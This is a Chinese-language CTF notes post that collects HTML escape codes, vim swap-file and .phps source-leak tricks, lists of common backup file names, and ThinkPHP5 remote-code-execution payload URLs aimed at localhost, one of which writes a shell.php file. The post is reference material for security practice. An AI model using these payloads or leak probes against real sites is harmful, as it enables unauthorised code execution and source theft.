---
title: CTF中琐碎的姿势们
date: 2020-06-16 19:42:02
tags:
  - CTF
categories:
  - 网络安全
---

记录CTF中的一些琐碎杂项备忘，方便查找。

<!-- more -->

## HTML

### HTML中的特殊转义字符

| 字符                           | 十进制   | 转义字符   |
| ------------------------------ | -------- | ---------- |
| "                              | `&#34;`  | `&quot;`   |
| &                              | `&#38;`  | `&amp;`    |
| <                              | `&#60;`  | `&lt;`     |
| >                              | `&#62;`  | `&gt;`     |
| 不断开空格(non-breaking space) | `&#160;` | `&nbsp;`   |
| \|                             | `&#166;` | `&brvbar;` |

## Linux

### vim

### .swp/.swo/... 文件

这些文件是vim创建的临时文件。一个文件在vim中打开之后会创建 .swp 文件。如果 .swp 文件已存在，则创建 .swo 文件，若 .swo 文件存在则创建 .swn 文件，以此类推。vim 关闭时这些文件将自动被删除，若vim崩溃或被杀死，则保留。有时可用作 CTF 中源码的来源。

例如：一个叫 `abc.php` 的文件会产生一个名为 `.abc.php.swp` 的临时文件。注意文件最前面有一个小点。

## PHP

### PHP基础

#### -> , => , :: 的区别

`->` 是插入式解引用的符号，用法与C语言相似。`=>` 在数组中常常出现，用来连接键值对。`::` 与C语言中的 `.` 类似，用于调用类的内部成员，或类之间的相互调用。

### .phps

服务器遇php文件会解析。此时若想要读源码要使用phps文件。源码泄露的来源。

### thinkphp5 RCE

5.1.x php版本>5.5

```
http://127.0.0.1/index.php?s=index/think\request/input?data[]=phpinfo()&filter=assert

http://127.0.0.1/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()

http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&content=<?php%20phpinfo();?>
```

5.0.x php版本>=5.4

```
http://127.0.0.1/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```

还可参见[**Thinkphp**5 RCE总结 – Y4er的博客](https://y4er.com/post/thinkphp5-rce/#5020)。

## 配置错误

### 源码泄露

#### 常见的网站源码备份文件后缀

- tar
- tar.gz
- zip
- rar

#### 常见的网站源码备份文件名

- web
- website
- backup
- back
- www
- wwwroot
- temp